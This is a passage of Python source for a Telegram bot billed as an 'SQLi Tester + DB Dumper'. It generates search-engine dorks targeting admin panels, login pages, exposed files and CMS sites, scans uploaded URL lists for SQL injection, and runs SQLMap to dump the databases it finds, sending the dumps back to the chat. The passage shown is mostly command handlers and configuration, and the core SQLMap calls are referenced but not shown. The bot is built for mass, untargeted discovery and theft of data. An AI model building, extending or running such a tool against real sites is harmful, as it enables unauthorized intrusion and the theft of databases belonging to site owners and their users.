    await update.message.reply_text(f"🏁 All done{cancelled_note}!\n\nPhase 1 — Injectable URLs : {len(candidates)}\nPhase 2 — DB dumps sent   : {dumped_count}")
    try:
        os.unlink(file_path)
    except:
        pass
    state["file_path"] = None
    state["scanning"] = False

async def run_dump_direct(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, tmp_path: str, source_name: str):
    state = get_scan_state(user_id)
    cancel_ev = state["cancel_event"]
    threads = state["threads"]
    chat_id = update.effective_chat.id
    state["scanning"] = True
    cancel_ev.clear()
    try:
        urls = read_urls_from_file(tmp_path)
    except Exception as e:
        await update.message.reply_text(f"❌ Error reading file: {e}")
        state["scanning"] = False
        os.unlink(tmp_path)
        return
    if not urls:
        await update.message.reply_text("⚠️ File is empty or has no valid URLs.")
        state["scanning"] = False
        os.unlink(tmp_path)
        return
    await update.message.reply_text(f"💾 /dump started — skipping Phase 1\n\n📄 File    : {source_name}\n🔗 URLs    : {len(urls)}\n🧵 Threads : {threads}\n\nRunning SQLMap on all {len(urls)} URL(s) directly...")
    dumped_count = await execute_dump(urls, chat_id, context, cancel_ev, threads, "Dump")
    cancelled_note = " (cancelled)" if cancel_ev.is_set() else ""
    await update.message.reply_text(f"🏁 /dump complete{cancelled_note}!\n\nTotal URLs  : {len(urls)}\nDB dumps sent : {dumped_count}")
    try:
        os.unlink(tmp_path)
    except:
        pass
    state["scanning"] = False

# ========================= DORK COMMAND HANDLERS =========================

def _cat_summary(cfg: Dict[str, Any]) -> str:
    enabled = set(cfg.get("templates", []))
    lines = []
    for cat, tids in TEMPLATE_CATEGORIES.items():
        active = [t for t in tids if t in enabled]
        label = CATEGORY_LABELS[cat]
        lines.append(f"{label}: {len(active)}/{len(tids)} templates")
    return "\n".join(lines)

def _preview_list(lst: list, n: int = 6) -> str:
    shown = lst[:n]
    more = f" …+{len(lst)-n}" if len(lst) > n else ""
    if not shown:
        return "_none_"
    return "`" + "`, `".join(shown) + "`" + more

async def dork_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    try:
        amount = int(ctx.args[0]) if ctx.args else 100
        amount = max(1, min(amount, 1_000_000))
    except (IndexError, ValueError):
        await update.message.reply_text("❌ Usage: /dork <amount>")
        return
    cfg = get_cfg(user_id)
    keywords = cfg.get("keywords", [])
    if not keywords:
        await update.message.reply_text("❌ No keywords set. Use /setkeywords to add keywords first.")
        return
    enabled_count = len(cfg.get("templates", []))
    if not enabled_count:
        await update.message.reply_text("❌ No templates enabled. Use /category or /settemplates.")
        return
    status = await update.message.reply_text(
        f"⚙️ Generating {amount:,} dorks…\n"
        f"📁 Keywords: {len(keywords):,} | 📋 Templates: {enabled_count}/{len(DORK_TEMPLATES)}"
    )
    # Use streaming for large amounts
    if amount > 100_000:
        buf = await generate_dorks_with_progress(update, keywords, amount, cfg, status)
    else:
        dorks = generate_dorks(keywords, amount, cfg)
        if not dorks:
            await status.edit_text("❌ No dorks generated. Check /config and make sure templates are enabled.")
            return
        buf = io.BytesIO("\n".join(dorks).encode())
        buf.name = f"dorks_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{len(dorks)}.txt"
    if buf is None:
        return
    log_generation(user_id, len(keywords), amount)  # Note: amount is passed as kw_count (historical)
    await status.delete()
    cat_summary = active_category_summary(cfg)
    await update.message.reply_document(
        document=buf, filename=buf.name,
        caption=(
            f"✅ *{amount:,} dorks generated*\n"
            f"📁 Keywords: {len(keywords):,} | 📋 Templates: {enabled_count}/{len(DORK_TEMPLATES)}\n\n"
            f"*Active categories:*\n{cat_summary}"
        ),
        parse_mode="Markdown"
    )

async def quickdork_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """Generate dorks on the fly without saving keywords."""
    user_id = update.effective_user.id
    if not ctx.args:
        await update.message.reply_text(
            "❌ Usage: `/quickdork <keyword> [amount]`\n"
            "Example: `/quickdork shop 200`",
            parse_mode="Markdown"
        )
        return
    try:
        amount = int(ctx.args[-1])
        keywords = [" ".join(ctx.args[:-1]).strip()]
        if not keywords[0]:
            raise ValueError
    except (ValueError, IndexError):
        amount = 100
        keywords = [" ".join(ctx.args).strip()]
    amount = max(1, min(amount, 100_000))
    cfg = get_cfg(user_id)
    status = await update.message.reply_text(f"⚡ Quick-generating {amount:,} dorks for `{keywords[0]}`…", parse_mode="Markdown")
    dorks = generate_dorks(keywords, amount, cfg)
    if not dorks:
        await status.edit_text("❌ No dorks generated.")
        return
    await status.delete()
    buf = io.BytesIO("\n".join(dorks).encode())
    buf.name = f"quickdork_{keywords[0][:20]}_{len(dorks)}.txt"
    await update.message.reply_document(
        document=buf, filename=buf.name,
        caption=f"⚡ *{len(dorks):,} quick dorks* for `{keywords[0]}`",
        parse_mode="Markdown"
    )

async def preview_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    try:
        amount = int(ctx.args[0]) if ctx.args else 5
        amount = max(1, min(amount, 20))
    except (IndexError, ValueError):
        await update.message.reply_text("❌ Usage: /preview <amount> (max 20)")
        return
    cfg = get_cfg(user_id)
    keywords = cfg.get("keywords", [])
    if not keywords:
        await update.message.reply_text("❌ No keywords set.")
        return
    dorks = generate_dorks(keywords, amount, cfg)
    if not dorks:
        await update.message.reply_text("❌ No dorks generated.")
        return
    preview = "\n".join(f"`{d}`" for d in dorks)
    await update.message.reply_text(f"*Preview of {len(dorks)} dorks:*\n{preview}", parse_mode="Markdown")

async def config_cmd(update: Update, _ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    cfg = get_cfg(uid)
    enabled = set(cfg.get("templates", []))
    cat_lines = []
    for cat, tids in TEMPLATE_CATEGORIES.items():
        active = [t for t in tids if t in enabled]
        cat_lines.append(
            f"{CATEGORY_LABELS[cat]}: *{len(active)}/{len(tids)}* active"
        )
    text = (
        f"⚙️ *Your Dork Config*\n\n"
        f"*Templates ({len(enabled)}/{len(DORK_TEMPLATES)} total):*\n" +
        "\n".join(cat_lines) +
        f"\n\n"
        f"*Keywords ({len(cfg['keywords'])}):* {_preview_list(cfg['keywords'])}\n"
        f"*SQL Params ({len(cfg['params'])}):* {_preview_list(cfg['params'])}\n"
        f"*TLDs ({len(cfg['tlds'])}):* {_preview_list(cfg['tlds'])}\n"
        f"*Operators ({len(cfg['operators'])}):* {_preview_list(cfg['operators'])}\n"
        f"*Extensions ({len(cfg['extensions'])}):* {_preview_list(cfg['extensions'])}\n"
        f"*Numbers ({len(cfg['numbers'])}):* {_preview_list(cfg['numbers'])}\n"
        f"*CMS ({len(cfg.get('cms', DEFAULT_CMS))}):* {_preview_list(cfg.get('cms', DEFAULT_CMS))}\n\n"
        f"🔀 Shuffle: `{'On' if cfg['shuffle'] else 'Off'}`  "
        f"🔁 Dedupe: `{'On' if cfg['dedupe'] else 'Off'}`"
    )
    kb = InlineKeyboardMarkup([[
        InlineKeyboardButton("📋 Templates", callback_data="cfg_nav:settemplates"),
        InlineKeyboardButton("🏷️ Category", callback_data="cfg_nav:category"),
    ], [
        InlineKeyboardButton("🔧 Params",  callback_data="cfg_nav:setparams"),
        InlineKeyboardButton("🌐 TLDs",    callback_data="cfg_nav:settlds"),
    ], [
        InlineKeyboardButton("🔍 Operators", callback_data="cfg_nav:setoperators"),
        InlineKeyboardButton("📄 Exts",      callback_data="cfg_nav:setextensions"),
    ]])
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=kb)

async def cb_cfg_nav(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    q = update.callback_query
    await q.answer()
    dest = q.data.split(":", 1)[1]
    fake_update = update
    cmd_map = {
        "settemplates": settemplates_cmd,
        "category":     category_cmd,
        "setparams":    setparams_cmd,
        "settlds":      settlds_cmd,
        "setoperators": setoperators_cmd,
        "setextensions":setextensions_cmd,
    }
    if dest in cmd_map:
        ctx.args = []
        await cmd_map[dest](fake_update, ctx)

async def stats_cmd(update: Update, _ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    s = get_stats(uid)
    cfg = get_cfg(uid)
    kw = cfg.get("keywords", [])
    text = (
        f"📊 *Your Dork Stats*\n\n"
        f"Total runs   : `{s['runs']}`\n"
        f"Total dorks  : `{s['total']:,}`\n"
        f"Last run     : `{s['last'] or 'Never'}`\n\n"
        f"*Current Config*\n"
        f"Keywords     : `{len(kw)}`\n"
        f"Templates    : `{len(cfg.get('templates', []))}/{len(DORK_TEMPLATES)}`\n"
        f"Active cats  :\n{_cat_summary(cfg)}"
    )
    await update.message.reply_text(text, parse_mode="Markdown")

async def setkeywords_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if update.message.reply_to_message and update.message.reply_to_message.document:
        doc = update.message.reply_to_message.document
        if not doc.file_name.endswith(".txt"):
            await update.message.reply_text("❌ File must be .txt with one keyword per line.")
            return
        raw = await (await ctx.bot.get_file(doc.file_id)).download_as_bytearray()
        keywords = [ln.strip() for ln in raw.decode(errors="ignore").splitlines() if ln.strip()]
        if not keywords:
            await update.message.reply_text("❌ File is empty.")
            return
        cfg = get_cfg(uid)
        cfg["keywords"] = keywords
        save_cfg(uid, cfg)
        await update.message.reply_text(f"✅ Set {len(keywords)} keywords from file.")
        return
    if ctx.args:
        raw = " ".join(ctx.args)
        keywords = [k.strip() for k in raw.split(",") if k.strip()]
        if keywords:
            cfg = get_cfg(uid)
            cfg["keywords"] = keywords
            save_cfg(uid, cfg)
            await update.message.reply_text(f"✅ Set {len(keywords)} keywords: `{', '.join(keywords[:10])}`", parse_mode="Markdown")
        else:
            await update.message.reply_text("❌ No valid keywords. Use commas or reply to a .txt file.")
    else:
        await update.message.reply_text(
            "📝 Usage:\n"
            "• `/setkeywords keyword1, keyword2, ...`\n"
            "• Reply to a `.txt` file with `/setkeywords`\n"
            "• Use `/addkeywords` to append without replacing",
            parse_mode="Markdown"
        )

async def addkeywords_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """Append keywords without replacing existing ones."""
    uid = update.effective_user.id
    cfg = get_cfg(uid)
    existing = cfg.get("keywords", [])
    if update.message.reply_to_message and update.message.reply_to_message.document:
        doc = update.message.reply_to_message.document
        if not doc.file_name.endswith(".txt"):
            await update.message.reply_text("❌ File must be .txt with one keyword per line.")
            return
        raw = await (await ctx.bot.get_file(doc.file_id)).download_as_bytearray()
        new_kw = [ln.strip() for ln in raw.decode(errors="ignore").splitlines() if ln.strip()]
    elif ctx.args:
        new_kw = [k.strip() for k in " ".join(ctx.args).split(",") if k.strip()]
    else:
        await update.message.reply_text(
            "📝 Usage: `/addkeywords keyword1, keyword2, ...` or reply to a `.txt` file.",
            parse_mode="Markdown"
        )
        return
    if not new_kw:
        await update.message.reply_text("❌ No valid keywords found.")
        return
    merged = list(dict.fromkeys(existing + new_kw))
    cfg["keywords"] = merged
    save_cfg(uid, cfg)
    await update.message.reply_text(
        f"✅ Added {len(new_kw)} keywords. Total: *{len(merged)}*",
        parse_mode="Markdown"
    )

async def clearkeywords_cmd(update: Update, _ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    cfg = get_cfg(uid)
    count = len(cfg.get("keywords", []))
    cfg["keywords"] = []
    save_cfg(uid, cfg)
    await update.message.reply_text(f"🗑️ Cleared {count} keyword(s).")

async def setcms_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    cfg = get_cfg(uid)
    if ctx.args:
        items = [i.strip().lower() for i in " ".join(ctx.args).split(",") if i.strip()]
        if items:
            cfg["cms"] = items
            save_cfg(uid, cfg)
            await update.message.reply_text(f"✅ CMS list set: `{', '.join(items)}`", parse_mode="Markdown")
            return
    current = cfg.get("cms", DEFAULT_CMS)
    await update.message.reply_text(
        f"🖥️ *Current CMS list ({len(current)}):*\n`{', '.join(current)}`\n\n"
        f"Usage: `/setcms wordpress, joomla, drupal`",
        parse_mode="Markdown"
    )

def _toggle_kb(prefix: str, all_items: List[str], active: List[str], cols: int = 2) -> List[List[InlineKeyboardButton]]:
    buttons = []
    row = []
    for item in all_items:
        icon = "✅" if item in active else "❌"
        row.append(InlineKeyboardButton(f"{icon} {item}", callback_data=f"{prefix}:{item}"))
        if len(row) == cols:
            buttons.append(row)
            row = []
    if row:
        buttons.append(row)
    buttons.append([
        InlineKeyboardButton("✅ All", callback_data=f"{prefix}:__ALL__"),
        InlineKeyboardButton("❌ None", callback_data=f"{prefix}:__NONE__"),
        InlineKeyboardButton("💾 Save", callback_data=f"{prefix}:__SAVE__"),
    ])
    return buttons

def _build_template_rows(cfg: Dict[str, Any]) -> List[List[InlineKeyboardButton]]:
    rows = []
    for cat, tids in TEMPLATE_CATEGORIES.items():
        rows.append([InlineKeyboardButton(f"── {CATEGORY_LABELS[cat]} ──", callback_data="tmpl:__NOP__")])
        for tid in tids:
            icon = "✅" if tid in cfg["templates"] else "❌"
            desc = TEMPLATE_DESCRIPTIONS.get(tid, "")
            rows.append([InlineKeyboardButton(f"{icon} {tid} — {desc}", callback_data=f"tmpl:{tid}")])
    rows.append([
        InlineKeyboardButton("✅ All",  callback_data="tmpl:__ALL__"),
        InlineKeyboardButton("❌ None", callback_data="tmpl:__NONE__"),
        InlineKeyboardButton("💾 Done", callback_data="tmpl:__SAVE__"),
    ])
    return rows

async def settemplates_cmd(update: Update, _ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    cfg = get_cfg(uid)
    rows = _build_template_rows(cfg)
    msg = update.message or (update.callback_query and update.callback_query.message)
    await msg.reply_text(
        "📋 *Toggle Dork Templates*\nTap a template to toggle it on/off:",
        reply_markup=InlineKeyboardMarkup(rows),
        parse_mode="Markdown"
    )

async def category_cmd(update: Update, _ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """Toggle all templates in a category at once."""
    uid = update.effective_user.id
    cfg = get_cfg(uid)
    enabled = set(cfg.get("templates", []))
    rows = []
    for cat, tids in TEMPLATE_CATEGORIES.items():
        active_count = sum(1 for t in tids if t in enabled)
        all_on = active_count == len(tids)
        icon = "✅" if all_on else ("🟡" if active_count > 0 else "❌")
        rows.append([InlineKeyboardButton(
            f"{icon} {CATEGORY_LABELS[cat]} ({active_count}/{len(tids)})",
            callback_data=f"cat:{cat}"
        )])
    rows.append([
        InlineKeyboardButton("✅ All Categories", callback_data="cat:__ALL__"),
        InlineKeyboardButton("❌ None",           callback_data="cat:__NONE__"),
    ])
    msg = update.message or (update.callback_query and update.callback_query.message)
    await msg.reply_text(
        "🏷️ *Toggle Template Categories*\nTap a category to toggle all its templates:",
        reply_markup=InlineKeyboardMarkup(rows),
        parse_mode="Markdown"
    )

async def cb_category(update: Update, _ctx: ContextTypes.DEFAULT_TYPE) -> None:
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    action = q.data.split(":", 1)[1]
    cfg = get_cfg(uid)
    enabled = set(cfg.get("templates", []))
    if action == "__ALL__":
        enabled = set(DORK_TEMPLATES.keys())
    elif action == "__NONE__":
        enabled = set()
    elif action in TEMPLATE_CATEGORIES:
        tids = set(TEMPLATE_CATEGORIES[action])
        if tids <= enabled:
            enabled -= tids
        else:
            enabled |= tids
    cfg["templates"] = [t for t in DORK_TEMPLATES if t in enabled]
    save_cfg(uid, cfg)
    rows = []
    for cat, tids in TEMPLATE_CATEGORIES.items():
        active_count = sum(1 for t in tids if t in enabled)
        all_on = active_count == len(tids)
        icon = "✅" if all_on else ("🟡" if active_count > 0 else "❌")
        rows.append([InlineKeyboardButton(
            f"{icon} {CATEGORY_LABELS[cat]} ({active_count}/{len(tids)})",
            callback_data=f"cat:{cat}"
        )])
    rows.append([
        InlineKeyboardButton("✅ All Categories", callback_data="cat:__ALL__"),
        InlineKeyboardButton("❌ None",           callback_data="cat:__NONE__"),
    ])
    await q.edit_message_reply_markup(InlineKeyboardMarkup(rows))

async def cb_template(update: Update, _ctx: ContextTypes.DEFAULT_TYPE) -> None:
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    action = q.data.split(":", 1)[1]
    if action == "__NOP__":
        return
    cfg = get_cfg(uid)
    if action == "__SAVE__":
        save_cfg(uid, cfg)
        await q.edit_message_text(f"✅ Templates saved — {len(cfg['templates'])}/{len(DORK_TEMPLATES)} active.")
        return
    elif action == "__ALL__":
        cfg["templates"] = list(DORK_TEMPLATES.keys())
    elif action == "__NONE__":
        cfg["templates"] = []
    else:
        if action in cfg["templates"]:
            cfg["templates"].remove(action)
        else:
            cfg["templates"].append(action)
        cfg["templates"] = [t for t in DORK_TEMPLATES if t in cfg["templates"]]
    save_cfg(uid, cfg)
    rows = _build_template_rows(cfg)
    await q.edit_message_reply_markup(InlineKeyboardMarkup(rows))

LIST_CONFIGS = {
    "param": ("params", DEFAULT_PARAMS, 3, "🔧 SQL Parameters"),
    "tld":   ("tlds", COMMON_TLDS_SUBSET, 3, "🌐 Common TLDs"),
    "op":    ("operators", DEFAULT_OPERATORS, 2, "🔍 Search Operators"),
    "ext":   ("extensions", ALL_EXTENSIONS, 4, "📄 File Extensions"),
}

async def _show_list_kb(update: Update, prefix: str, cfg: Dict) -> None:
    _, all_items, cols, title = LIST_CONFIGS[prefix]
    kb = _toggle_kb(prefix, all_items, cfg[LIST_CONFIGS[prefix][0]], cols)
    await update.message.reply_text(f"{title}\nTap to toggle  ✅=On  ❌=Off", reply_markup=InlineKeyboardMarkup(kb))

async def cb_list_toggle(update: Update, _ctx: ContextTypes.DEFAULT_TYPE) -> None:
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    prefix, value = q.data.split(":", 1)
    if prefix not in LIST_CONFIGS:
        return
    cfg = get_cfg(uid)
    cfg_key, all_items, _, _ = LIST_CONFIGS[prefix]
    if value == "__SAVE__":
        save_cfg(uid, cfg)
        await q.edit_message_text(f"✅ Saved {cfg_key}: {len(cfg[cfg_key])} selected.")
        return
    elif value == "__ALL__":
        cfg[cfg_key] = all_items.copy()
    elif value == "__NONE__":
        cfg[cfg_key] = []
    else:
        lst = cfg[cfg_key]
        if value in lst:
            lst.remove(value)
        else:
            lst.append(value)
    save_cfg(uid, cfg)
    kb = _toggle_kb(prefix, all_items, cfg[cfg_key], LIST_CONFIGS[prefix][2])
    await q.edit_message_reply_markup(InlineKeyboardMarkup(kb))

async def setparams_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    cfg = get_cfg(uid)
    if ctx.args:
        items = [i.strip() for i in " ".join(ctx.args).split(",") if i.strip()]
        if items:
            cfg["params"] = items
            save_cfg(uid, cfg)
            await update.message.reply_text(f"✅ Params set: `{', '.join(items)}`", parse_mode="Markdown")
            return
    await _show_list_kb(update, "param", cfg)

async def settlds_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    cfg = get_cfg(uid)
    if ctx.args:
        items = [i.strip() for i in " ".join(ctx.args).split(",") if i.strip()]
        items = [t if t.startswith(".") else f".{t}" for t in items]
        if items:
            cfg["tlds"] = items
            save_cfg(uid, cfg)
            await update.message.reply_text(f"✅ TLDs set: `{', '.join(items)}`", parse_mode="Markdown")
            return
    await _show_list_kb(update, "tld", cfg)

async def setoperators_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    cfg = get_cfg(uid)
    if ctx.args:
        items = [i.strip() for i in " ".join(ctx.args).split(",") if i.strip()]
        if items:
            cfg["operators"] = items
            save_cfg(uid, cfg)
            await update.message.reply_text(f"✅ Operators set: `{', '.join(items)}`", parse_mode="Markdown")
            return
    await _show_list_kb(update, "op", cfg)

async def setextensions_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    cfg = get_cfg(uid)
    if ctx.args:
        items = [i.strip() for i in " ".join(ctx.args).split(",") if i.strip()]
        items = [e if e.startswith(".") else f".{e}" for e in items]
        if items:
            cfg["extensions"] = items
            save_cfg(uid, cfg)
            await update.message.reply_text(f"✅ Extensions set: `{', '.join(items)}`", parse_mode="Markdown")
            return
    await _show_list_kb(update, "ext", cfg)

async def setnumbers_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    cfg = get_cfg(uid)
    if ctx.args:
        nums = [n.strip() for n in " ".join(ctx.args).split(",") if n.strip()]
        if nums:
            cfg["numbers"] = nums
            save_cfg(uid, cfg)
            await update.message.reply_text(f"✅ Numbers set: `{', '.join(nums)}`", parse_mode="Markdown")
        else:
            await update.message.reply_text("❌ Provide comma-separated numbers.")
    else:
        await update.message.reply_text(f"🔢 Current numbers: `{', '.join(cfg['numbers'])}`\nUse `/setnumbers 0,1,2,10` to change.", parse_mode="Markdown")

async def toggleshuffle_cmd(update: Update, _ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    cfg = get_cfg(uid)
    cfg["shuffle"] = not cfg.get("shuffle", True)
    save_cfg(uid, cfg)
    await update.message.reply_text(f"🔀 Shuffle: {'ON' if cfg['shuffle'] else 'OFF'}")

async def togglededupe_cmd(update: Update, _ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    cfg = get_cfg(uid)
    cfg["dedupe"] = not cfg.get("dedupe", True)
    save_cfg(uid, cfg)
    await update.message.reply_text(f"🔁 Deduplicate: {'ON' if cfg['dedupe'] else 'OFF'}")

async def reset_cmd(update: Update, _ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    save_cfg(uid, _default_config())
    await update.message.reply_text("✅ Dork config reset to defaults.")

async def exportconfig_cmd(update: Update, _ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    cfg = get_cfg(uid)
    buf = io.BytesIO(json.dumps(cfg, indent=2).encode())
    buf.name = f"dork_config_{uid}.json"
    await update.message.reply_document(document=buf, filename=buf.name, caption="⚙️ Your current dork config.")

async def importconfig_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    msg = update.message
    doc = msg.reply_to_message.document if msg.reply_to_message and msg.reply_to_message.document else msg.document
    if not doc or not doc.file_name.endswith(".json"):
        await msg.reply_text("❌ Reply to a `.json` config file with `/importconfig`")
        return
    raw = await (await ctx.bot.get_file(doc.file_id)).download_as_bytearray()
    try:
        cfg = json.loads(raw.decode())
        valid_keys = set(_default_config().keys())
        if not set(cfg.keys()) <= valid_keys:
            raise ValueError(f"Unknown keys: {set(cfg.keys()) - valid_keys}")
        save_cfg(update.effective_user.id, cfg)
        await msg.reply_text("✅ Config imported successfully!")
    except Exception as exc:
        await msg.reply_text(f"❌ Invalid config: `{exc}`", parse_mode="Markdown")

async def generate_all_cmd(update: Update, _ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    cfg = get_cfg(uid)
    if not cfg.get("keywords"):
        await update.message.reply_text("❌ No keywords set. Use /setkeywords first.")
        return
    if not cfg.get("templates"):
        await update.message.reply_text("❌ No templates enabled. Use /settemplates.")
        return

    total_estimate = _estimate_total_dorks(cfg)
    if total_estimate > 1_000_000:
        await update.message.reply_text(
            f"⚠️ Estimated total dorks: {total_estimate:,} — exceeds limit of 1,000,000.\n"
            "Use /dork with a specific amount or reduce parameters."
        )
        return

    status = await update.message.reply_text("⚙️ Generating all possible dorks (this may take a while)...")
    # Use streaming to generate all
    buf = await generate_dorks_with_progress(update, cfg["keywords"], total_estimate, cfg, status)
    if buf is None:
        return
    log_generation(uid, total_estimate, len(cfg["keywords"]))
    await status.delete()
    await update.message.reply_document(document=buf, filename=buf.name, caption=f"✅ All possible dorks: {total_estimate:,}")

async def gen_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    try:
        amount = int(ctx.args[0]) if ctx.args else 100
        amount = max(1, min(amount, 500_000))
    except (IndexError, ValueError):
        await update.message.reply_text("❌ Usage: /gen <amount> (optionally reply to a keywords .txt file)")
        return
    cfg = get_cfg(uid)
    keywords = None
    if update.message.reply_to_message and update.message.reply_to_message.document:
        doc = update.message.reply_to_message.document
        if doc.file_name.endswith(".txt"):
            raw = await (await ctx.bot.get_file(doc.file_id)).download_as_bytearray()
            keywords = [ln.strip() for ln in raw.decode(errors="ignore").splitlines() if ln.strip()]
    if not keywords:
        keywords = cfg.get("keywords", [])
    if not keywords:
        await update.message.reply_text("❌ No keywords. Use /setkeywords or reply to a keywords .txt file.")
        return
    status = await update.message.reply_text(f"⚙️ Generating {amount:,} dorks…")
    dorks = generate_dorks(keywords, amount, cfg)
    if not dorks:
        await status.edit_text("❌ No dorks generated.")
        return
    log_generation(uid, len(dorks), len(keywords))
    await status.delete()
    buf = io.BytesIO("\n".join(dorks).encode())
    buf.name = f"gen_{len(dorks)}.txt"
    await update.message.reply_document(document=buf, filename=buf.name, caption=f"✅ {len(dorks):,} dorks generated from {len(keywords):,} keywords")

async def estimate_cmd(update: Update, _ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    cfg = get_cfg(uid)
    total = _estimate_total_dorks(cfg)
    await update.message.reply_text(
        f"📊 *Estimated maximum unique dorks:* `{total:,}`\n"
        f"(based on current keywords, templates, and placeholder lists)",
        parse_mode="Markdown"
    )

async def setpreset_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if not ctx.args:
        await update.message.reply_text("Usage: /setpreset <fast|balanced|wide>")
        return
    preset = ctx.args[0].lower()
    cfg = get_cfg(uid)
    if preset == "fast":
        cfg["templates"] = ["T01","T02","T07","T08"]
        cfg["extensions"] = [".php"]
        cfg["tlds"] = [".com", ".net", ".org"]
        cfg["params"] = ["id", "page"]
        cfg["operators"] = ["inurl:", "intitle:"]
        cfg["shuffle"] = False
        cfg["dedupe"] = True
    elif preset == "balanced":
        cfg["templates"] = DEFAULT_ENABLED_TEMPLATES.copy()
        cfg["extensions"] = [".php", ".asp"]
        cfg["tlds"] = COMMON_TLDS_SUBSET[:20]
        cfg["params"] = DEFAULT_PARAMS[:10]
        cfg["shuffle"] = True
        cfg["dedupe"] = True
    elif preset == "wide":
        cfg["templates"] = list(DORK_TEMPLATES.keys())
        cfg["extensions"] = ALL_EXTENSIONS
        cfg["tlds"] = COMMON_TLDS_SUBSET
        cfg["params"] = DEFAULT_PARAMS
        cfg["shuffle"] = True
        cfg["dedupe"] = True
    else:
        await update.message.reply_text("Unknown preset. Use fast, balanced, or wide.")
        return
    save_cfg(uid, cfg)
    await update.message.reply_text(f"✅ Config preset set to *{preset}*", parse_mode="Markdown")

# ========================= SQLI COMMAND HANDLERS =========================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"🛡️ *SQLi Tester + DB Dumper  v{VERSION}*\n"
        f"🎯 *Dork Generator v4  |  20 Templates  |  5 Categories*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "⚡ *SQLi Testing:*\n"
        "  1️⃣ Upload a .txt file (one URL per line)\n"
        "  2️⃣ /scan → Phase 1 finds injectable URLs, Phase 2 dumps DB\n"
        "  /dump (reply to .txt) → dump all URLs directly\n\n"
        "🎯 *Dork Generator:*\n"
        "  /setkeywords shop,login,admin  — save keywords\n"
        "  /quickdork <keyword> [n]  — instant dorks, no saving\n"
        "  /dork <n>  — generate dorks with breakdown by category\n"
        "  /category  — toggle 6 template categories at once\n"
        "  /config  — full settings + quick-nav buttons\n"
        "  /estimate  — show estimated total dorks\n"
        "  /setpreset <fast|balanced|wide>  — quick config\n\n"
        "📋 *Full help:* /help",
        parse_mode="Markdown"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 *Full Help*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "*SQLi Scanner:*\n"
        "/scan – two-phase scan + dump\n"
        "/dump – direct SQLMap dump (reply to .txt)\n"
        "/cancel – stop running scan/dump\n"
        "/status – current scan state\n"
        "/myconfig – SQLi settings\n"
        "/setfilter <low|medium|high>\n"
        "/setconcurrent <1-200>\n"
        "/settimeout <1-60>\n"
        "/setthreads <1-10>\n\n"
        "*Dork Generator:*\n"
        "/setkeywords – set keywords (replaces existing)\n"
        "/addkeywords – append keywords (keeps existing)\n"
        "/clearkeywords – clear all keywords\n"
        "/quickdork <kw> [n] – instant dorks without saving\n"
        "/dork <n> – generate n dorks (with category breakdown)\n"
        "/preview <n> – preview n dorks inline\n"
        "/gen <n> – generate (optionally reply to keywords .txt)\n"
        "/generate – all possible dorks (cartesian product)\n"
        "/estimate – estimate max unique dorks with current config\n"
        "/setpreset <fast|balanced|wide> – quick config presets\n\n"
        "*Templates & Config:*\n"
        "/config – full config + quick-nav buttons\n"
        "/category – toggle template categories (fast!)\n"
        "/settemplates – toggle individual templates\n"
        "/setparams – set SQL parameter names\n"
        "/settlds – set target TLDs\n"
        "/setoperators – set search operators\n"
        "/setextensions – set file extensions\n"
        "/setnumbers – set numbers for (NB) placeholder\n"
        "/setcms – set CMS names for (CM) placeholder\n"
        "/toggleshuffle – shuffle output on/off\n"
        "/togglededupe – deduplication on/off\n"
        "/stats – generation history + config summary\n"
        "/reset – reset dork config to defaults\n"
        "/exportconfig – backup config as JSON\n"
        "/importconfig – restore config from JSON\n\n"
        "*Template Categories (20 total):*\n"
        "🟠 Admin/Panel (T01-T06)\n"
        "🟡 Login Pages (T07-T10)\n"
        "🟢 File Exposure (T11-T14)\n"
        "🔵 CMS-Specific (T15-T18)\n"
        "🟣 Error/Debug (T19-T20)\n\n"
        "*General:* /about, /start",
        parse_mode="Markdown"
    )

async def about(update: Update, context: ContextTypes.DEFAULT_TYPE):
